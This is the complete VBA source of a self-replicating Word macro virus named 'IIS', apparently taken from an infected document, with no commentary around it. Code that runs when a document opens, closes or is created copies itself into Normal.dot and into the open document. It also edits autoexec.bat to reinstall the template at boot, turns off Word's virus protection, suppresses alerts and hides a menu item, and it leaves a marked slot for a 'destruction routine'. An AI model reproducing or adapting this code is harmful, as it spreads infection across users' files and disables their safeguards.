   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
   Rem MyName = IIS
   Close
   On Error GoTo MegaJump
   Open "c:\msdos.sys" For Input As #1
   Do
   Line Input #1, ms
   If UCase(Left(ms, 7)) = "WINDIR=" Then
   a = Len(ms)
   windir = Mid(ms, 8, a)
   GoTo fert
   End If
   Loop
   Close
   fert:
   Close
   Open windir & "\system\Log.drv" For Append As #1
   Print #1, "+"
   Close
   NormInstalled = False
   ActInstalled = False
   NormalTemplate.VBProject.VBComponents(1).Export ("c:\vn.dll")
   ActiveDocument.VBProject.VBComponents(1).Export ("c:\vd.dll")
   NormInst = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   ActInst = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   If UCase(NormInst) = "REM MYNAME = IIS" Then NormInstalled = True
   If UCase(ActInst) = "REM MYNAME = IIS" Then ActInstalled = True

   Close
   Open "c:\Autoexec.bat" For Append As #12
   Close #12
   Open "c:\Autoexec.bat" For Input As #12
   Do Until EOF(12)
   If EOF(12) Then GoTo dss
   Line Input #12, a
   If a = "@del c:\normalb.dot" Then SetAttr (NormalTemplate.FullName), vbReadOnly
   Loop
   dss:

   If NormInstalled = True And ActIntalled = True Then GoTo esub
   If NormInstalled = True Then IW = "C:\vn.dll" Else IW = "C:\Vd.dll"
   Open IW For Input As #1
   FullCode = "Private Sub Document_Open()" & Chr(13)
   Do
   Line Input #1, VirCode
   Loop Until VirCode = "Private Sub Document_Open()"
   Do
   If VirCode = "End Sub" Then ess = ess + 1
   If ess = 3 Then GoTo jump
   Line Input #1, VirCode
   If VirCode = "Rem Written by Flitnic" Then GoTo jump
   FullCode = FullCode & VirCode & Chr(13)
   Loop
   jump:
   FullCode = FullCode & VirCode & Chr(13)
   FullCode = FullCode & "End Sub"
   If NormInstalled = False Then
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then GoTo AtrNo
   at = GetAttr(NormalTemplate.FullName)
   If at = 33 Then at = 1
   If at = 1 Then
   Close
   Open "c:\Autoexec.bat" For Append As #12
   Close #12
   Open "c:\Autoexec.bat" For Input As #12
   Do Until EOF(12)
   If EOF(12) Then GoTo ds
   Line Input #12, a
   If a = "@del c:\normalb.dot" Then GoTo fv
   Loop
   ds:
   SetAttr (NormalTemplate.FullName), vbNormal
   Documents.Add Template:="", NewTemplate:=False
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   ActiveDocument.SaveAs FileName:="C:\Normalb.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
   ActiveDocument.Save
   Close #1
   Open "c:\No.dat" For Append As #1
   Close #1
   ActiveDocument.Close
   Kill "c:\No.dat"
   Close #12
   Open "c:\autoexec.bat" For Append As #12
   Close #12

   FileCopy "c:\Autoexec.bat", "c:\Autoexec.bak"
   Close #12
   Open "c:\Autoexec.bat" For Append As #12
   Print #12, "@Copy /y C:\normalb.dot " & NormalTemplate.FullName
   Print #12, "@del c:\normalb.dot"
   Print #12, "@Copy /y c:\Autoexec.bak c:\Autoexec.bat"
   fv:
   Close
   Exit Sub
   End If
   AtrNo:
   Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then Exit Sub
   NormalTemplate.Save
   End If
   If ActInstalled = False Then
   If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   ActiveDocument.Save
   Else
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   End If
   End If
   esub:
   a = Dir(NormalTemplate.FullName)
   If a = "" Then Exit Sub
   at = GetAttr(NormalTemplate.FullName)
   If at = 33 Then at = 1
   If at = 1 Then GoTo gghh
   Close
   dd = Dir("c:\vn.dll")
   If dd = "" Then GoTo tz2a
   Kill "C:\vn.dll"
   tz2a:
   dd = Dir("c:\vd.dll")
   If dd = "" Then GoTo tz2b
   Kill "C:\vd.dll"
   tz2b:
   If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
   ActiveDocument.Save
   End If
   Open windir & "\system\Log.drv" For Input As #1
   lll = LOF(1)
   'IIS for NormalTemplate Create:
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then Exit Sub
   aAutoOpen = False
       For Ii = 1 To NormalTemplate.VBProject.VBComponents.Count
       a = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
       If a = "Sub IIS()" Then
       cl = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.CountOfLines
       NormalTemplate.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
       aAutoOpen = True
       Exit For
       End If
       Next Ii
       Ii = 0
       If aAutoOpen = False Then
       Close
       Open "c:\newvnb.dll" For Append As #2
       Print #2, "Attribute VB_Name = "; XXXXX; ""
       Close
       NormalTemplate.VBProject.VBComponents.Import ("c:\newvnb.dll")
       Kill "c:\newvnb.dll"
       End If
       iii = 0
       For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
       cl = NormalTemplate.VBProject.VBComponents(iii).CodeModule.CountOfLines
       If cl = 0 Then Exit For
       Next iii
   AutoOpenCode = "Sub IIS()" & Chr(13)
   AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
   AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
   NormalTemplate.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
   NormalTemplate.Save

   'IIS for ActiveDocument Create:
   If LCase(Mid(ActiveDocument.FullName, 1, 1)) = "a" Then GoTo nomacro
   at = GetAttr(ActiveDocument.FullName)
   If at = 33 Then at = 1
   If at = 1 Then GoTo nomacro
   If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
   dd = Dir(ActiveDocument.FullName)
   If dd = "" Then Exit Sub
   aAutoOpen = False
       For Ii = 1 To ActiveDocument.VBProject.VBComponents.Count
       a = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
       If a = "Sub IIS()" Then
       cl = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.CountOfLines
       ActiveDocument.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
       aAutoOpen = True
       Exit For
       End If
       Next Ii
       Ii = 0
       If aAutoOpen = False Then
       Close
       Open "c:\newvnb.dll" For Append As #2
       Print #2, "Attribute VB_Name = "; XXXXX; ""
       Close
       ActiveDocument.VBProject.VBComponents.Import ("c:\newvnb.dll")
       Kill "c:\newvnb.dll"
       End If
       iii = 0
       For iii = 1 To ActiveDocument.VBProject.VBComponents.Count
       cl = ActiveDocument.VBProject.VBComponents(iii).CodeModule.CountOfLines
       If cl = 0 Then Exit For
       Next iii
   AutoOpenCode = "Sub IIS()" & Chr(13)
   AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
   AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
   ActiveDocument.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
   ActiveDocument.Save
   End If
   nomacro:
   Close
   MegaJump:
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then GoTo gghh
   On Error Resume Next
   If GetAttr(NormalTemplate.FullName) = vbReadOnly Then GoTo gghh
   at = GetAttr(NormalTemplate.FullName)
   If at = 33 Then at = 1
   If at = 1 Then GoTo gghh
   NormalTemplate.Save
   Options.SaveNormalPrompt = False
   Options.VirusProtection = False
   Application.DisplayStatusBar = False
   Application.DisplayAlerts = False
   Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False

   'Insert destruction routine here:

   gghh:
   End Sub
   Private Sub Document_Close()
   Rem MyName = IIS
   a = Dir("c:\No.dat")
   If UCase(a) = "NO.DAT" Then
   Exit Sub
   End If
   Close
   On Error GoTo MegaJump
   Open "c:\msdos.sys" For Input As #1
   Do
   Line Input #1, ms
   If UCase(Left(ms, 7)) = "WINDIR=" Then
   a = Len(ms)
   windir = Mid(ms, 8, a)
   GoTo fert
   End If
   Loop
   Close
   fert:
   Close
   Open windir & "\system\Log.drv" For Append As #1
   Print #1, "+"
   Close
   NormInstalled = False
   ActInstalled = False
   NormalTemplate.VBProject.VBComponents(1).Export ("c:\vn.dll")
   ActiveDocument.VBProject.VBComponents(1).Export ("c:\vd.dll")
   NormInst = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   ActInst = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   If UCase(NormInst) = "REM MYNAME = IIS" Then NormInstalled = True
   If UCase(ActInst) = "REM MYNAME = IIS" Then ActInstalled = True

   Close
   Open "c:\Autoexec.bat" For Append As #12
   Close #12
   Open "c:\Autoexec.bat" For Input As #12
   Do Until EOF(12)
   If EOF(12) Then GoTo dss
   Line Input #12, a
   If a = "@del c:\normalb.dot" Then SetAttr (NormalTemplate.FullName), vbReadOnly
   Loop
   dss:

   If NormInstalled = True And ActIntalled = True Then GoTo esub
   If NormInstalled = True Then IW = "C:\vn.dll" Else IW = "C:\Vd.dll"
   Open IW For Input As #1
   FullCode = "Private Sub Document_Open()" & Chr(13)
   Do
   Line Input #1, VirCode
   Loop Until VirCode = "Private Sub Document_Open()"
   Do
   If VirCode = "End Sub" Then ess = ess + 1
   If ess = 3 Then GoTo jump
   Line Input #1, VirCode
   If VirCode = "Rem Written by Flitnic" Then GoTo jump
   FullCode = FullCode & VirCode & Chr(13)
   Loop
   jump:
   FullCode = FullCode & VirCode & Chr(13)
   FullCode = FullCode & "End Sub"
   If NormInstalled = False Then
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then GoTo AtrNo
   at = GetAttr(NormalTemplate.FullName)
   If at = 33 Then at = 1
   If at = 1 Then
   Close
   Exit Sub
   End If
   AtrNo:
   Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then Exit Sub
   NormalTemplate.Save
   End If
   If ActInstalled = False Then
   If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   ActiveDocument.Save
   Else
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   End If
   End If
   esub:
   a = Dir(NormalTemplate.FullName)
   If a = "" Then Exit Sub
   at = GetAttr(NormalTemplate.FullName)
   If at = 33 Then at = 1
   If at = 1 Then GoTo gghh
   Close
   dd = Dir("c:\vn.dll")
   If dd = "" Then GoTo tz2a
   Kill "C:\vn.dll"
   tz2a:
   dd = Dir("c:\vd.dll")
   If dd = "" Then GoTo tz2b
   Kill "C:\vd.dll"
   tz2b:
   If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
   ActiveDocument.Save
   End If
   Open windir & "\system\Log.drv" For Input As #1
   lll = LOF(1)
   'IIS for NormalTemplate Create:
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then Exit Sub
   aAutoOpen = False
       For Ii = 1 To NormalTemplate.VBProject.VBComponents.Count
       a = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
       If a = "Sub IIS()" Then
       cl = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.CountOfLines
       NormalTemplate.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
       aAutoOpen = True
       Exit For
       End If
       Next Ii
       Ii = 0
       If aAutoOpen = False Then
       Close
       Open "c:\newvnb.dll" For Append As #2
       Print #2, "Attribute VB_Name = "; XXXXX; ""
       Close
       NormalTemplate.VBProject.VBComponents.Import ("c:\newvnb.dll")
       Kill "c:\newvnb.dll"
       End If
       iii = 0
       For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
       cl = NormalTemplate.VBProject.VBComponents(iii).CodeModule.CountOfLines
       If cl = 0 Then Exit For
       Next iii
   AutoOpenCode = "Sub IIS()" & Chr(13)
   AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
   AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
   NormalTemplate.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
   NormalTemplate.Save
   'IIS for ActiveDocument Create:
   If LCase(Mid(ActiveDocument.FullName, 1, 1)) = "a" Then GoTo nomacro
   at = GetAttr(ActiveDocument.FullName)
   If at = 33 Then at = 1
   If at = 1 Then GoTo nomacro
   If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
   dd = Dir(ActiveDocument.FullName)
   If dd = "" Then Exit Sub
   aAutoOpen = False
       For Ii = 1 To ActiveDocument.VBProject.VBComponents.Count
       a = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
       If a = "Sub IIS()" Then
       cl = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.CountOfLines
       ActiveDocument.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
       aAutoOpen = True
       Exit For
       End If
       Next Ii
       Ii = 0
       If aAutoOpen = False Then
       Close
       Open "c:\newvnb.dll" For Append As #2
       Print #2, "Attribute VB_Name = "; XXXXX; ""
       Close
       ActiveDocument.VBProject.VBComponents.Import ("c:\newvnb.dll")
       Kill "c:\newvnb.dll"
       End If
       iii = 0
       For iii = 1 To ActiveDocument.VBProject.VBComponents.Count
       cl = ActiveDocument.VBProject.VBComponents(iii).CodeModule.CountOfLines
       If cl = 0 Then Exit For
       Next iii
   AutoOpenCode = "Sub IIS()" & Chr(13)
   AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
   AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
   ActiveDocument.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
   ActiveDocument.Save
   End If
   nomacro:


   Close
   MegaJump:
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then GoTo gghh
   On Error Resume Next
   If GetAttr(NormalTemplate.FullName) = vbReadOnly Then GoTo gghh
   at = GetAttr(NormalTemplate.FullName)
   If at = 33 Then at = 1
   If at = 1 Then GoTo gghh
   NormalTemplate.Save
   Options.SaveNormalPrompt = False
   Options.VirusProtection = False
   Application.DisplayStatusBar = False
   Application.DisplayAlerts = False
   Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False

   'Insert destruction routine here:


   gghh:
   End Sub
   Private Sub Document_New()
   Rem MyName = IIS
   a = Dir("c:\No.dat")
   If UCase(a) = "NO.DAT" Then
   Exit Sub
   End If
   Close
   On Error GoTo MegaJump
   Open "c:\msdos.sys" For Input As #1
   Do
   Line Input #1, ms
   If UCase(Left(ms, 7)) = "WINDIR=" Then
   a = Len(ms)
   windir = Mid(ms, 8, a)
   GoTo fert
   End If
   Loop
   Close
   fert:
   Close
   Open windir & "\system\Log.drv" For Append As #1
   Print #1, "+"
   Close
   NormInstalled = False
   ActInstalled = False
   NormalTemplate.VBProject.VBComponents(1).Export ("c:\vn.dll")
   ActiveDocument.VBProject.VBComponents(1).Export ("c:\vd.dll")
   NormInst = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   ActInst = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
   If UCase(NormInst) = "REM MYNAME = IIS" Then NormInstalled = True
   If UCase(ActInst) = "REM MYNAME = IIS" Then ActInstalled = True

   Close
   Open "c:\Autoexec.bat" For Append As #12
   Close #12
   Open "c:\Autoexec.bat" For Input As #12
   Do Until EOF(12)
   If EOF(12) Then GoTo dss
   Line Input #12, a
   If a = "@del c:\normalb.dot" Then SetAttr (NormalTemplate.FullName), vbReadOnly
   Loop
   dss:

   If NormInstalled = True And ActIntalled = True Then GoTo esub
   If NormInstalled = True Then IW = "C:\vn.dll" Else IW = "C:\Vd.dll"
   Open IW For Input As #1
   FullCode = "Private Sub Document_Open()" & Chr(13)
   Do
   Line Input #1, VirCode
   Loop Until VirCode = "Private Sub Document_Open()"
   Do
   If VirCode = "End Sub" Then ess = ess + 1
   If ess = 3 Then GoTo jump
   Line Input #1, VirCode
   If VirCode = "Rem Written by Flitnic" Then GoTo jump
   FullCode = FullCode & VirCode & Chr(13)
   Loop
   jump:
   FullCode = FullCode & VirCode & Chr(13)
   FullCode = FullCode & "End Sub"
   If NormInstalled = False Then
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then GoTo AtrNo
   at = GetAttr(NormalTemplate.FullName)
   If at = 33 Then at = 1
   If at = 1 Then
   Close
   Exit Sub
   End If
   AtrNo:
   Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then Exit Sub
   NormalTemplate.Save
   End If
   If ActInstalled = False Then
   If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   ActiveDocument.Save
   Else
   Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
   End If
   End If
   esub:
   a = Dir(NormalTemplate.FullName)
   If a = "" Then Exit Sub
   at = GetAttr(NormalTemplate.FullName)
   If at = 33 Then at = 1
   If at = 1 Then GoTo gghh
   Close
   dd = Dir("c:\vn.dll")
   If dd = "" Then GoTo tz2a
   Kill "C:\vn.dll"
   tz2a:
   dd = Dir("c:\vd.dll")
   If dd = "" Then GoTo tz2b
   Kill "C:\vd.dll"
   tz2b:
   If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
   ActiveDocument.Save
   End If
   Open windir & "\system\Log.drv" For Input As #1
   lll = LOF(1)
   'IIS for NormalTemplate Create:
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then Exit Sub
   aAutoOpen = False
       For Ii = 1 To NormalTemplate.VBProject.VBComponents.Count
       a = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
       If a = "Sub IIS()" Then
       cl = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.CountOfLines
       NormalTemplate.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
       aAutoOpen = True
       Exit For
       End If
       Next Ii
       Ii = 0
       If aAutoOpen = False Then
       Close
       Open "c:\newvnb.dll" For Append As #2
       Print #2, "Attribute VB_Name = "; XXXXX; ""
       Close
       NormalTemplate.VBProject.VBComponents.Import ("c:\newvnb.dll")
       Kill "c:\newvnb.dll"
       End If
       iii = 0
       For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
       cl = NormalTemplate.VBProject.VBComponents(iii).CodeModule.CountOfLines
       If cl = 0 Then Exit For
       Next iii
   AutoOpenCode = "Sub IIS()" & Chr(13)
   AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
   AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
   NormalTemplate.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
   NormalTemplate.Save
   'IIS for ActiveDocument Create:
   If LCase(Mid(ActiveDocument.FullName, 1, 1)) = "a" Then GoTo nomacro
   at = GetAttr(ActiveDocument.FullName)
   If at = 33 Then at = 1
   If at = 1 Then GoTo nomacro
   If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
   dd = Dir(ActiveDocument.FullName)
   If dd = "" Then Exit Sub
   aAutoOpen = False
       For Ii = 1 To ActiveDocument.VBProject.VBComponents.Count
       a = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
       If a = "Sub IIS()" Then
       cl = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.CountOfLines
       ActiveDocument.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
       aAutoOpen = True
       Exit For
       End If
       Next Ii
       Ii = 0
       If aAutoOpen = False Then
       Close
       Open "c:\newvnb.dll" For Append As #2
       Print #2, "Attribute VB_Name = "; XXXXX; ""
       Close
       ActiveDocument.VBProject.VBComponents.Import ("c:\newvnb.dll")
       Kill "c:\newvnb.dll"
       End If
       iii = 0
       For iii = 1 To ActiveDocument.VBProject.VBComponents.Count
       cl = ActiveDocument.VBProject.VBComponents(iii).CodeModule.CountOfLines
       If cl = 0 Then Exit For
       Next iii
   AutoOpenCode = "Sub IIS()" & Chr(13)
   AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
   AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
   ActiveDocument.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
   ActiveDocument.Save
   End If
   nomacro:

   Close
   MegaJump:
   dd = Dir(NormalTemplate.FullName)
   If dd = "" Then GoTo gghh
   On Error Resume Next
   If GetAttr(NormalTemplate.FullName) = vbReadOnly Then GoTo gghh
   at = GetAttr(NormalTemplate.FullName)
   If at = 33 Then at = 1
   If at = 1 Then GoTo gghh
   NormalTemplate.Save
   Options.SaveNormalPrompt = False
   Options.VirusProtection = False
   Application.DisplayStatusBar = False
   Application.DisplayAlerts = False
   Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False

   'Insert destruction routine here:

   gghh:
   Rem Written by Flitnic
   End Sub

   Attribute VB_Name = "Modul1"
   Sub IIS()
   'Macro created by Penelope
   End Sub
